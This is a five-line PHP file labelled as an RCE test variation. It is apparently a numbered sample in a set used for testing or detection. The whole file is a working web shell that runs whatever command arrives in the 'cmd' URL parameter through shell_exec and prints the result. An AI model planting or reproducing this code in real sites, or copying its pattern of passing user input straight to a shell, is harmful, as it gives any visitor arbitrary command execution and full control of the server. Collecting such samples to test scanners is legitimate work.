<?php
// RCE test variation #446
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>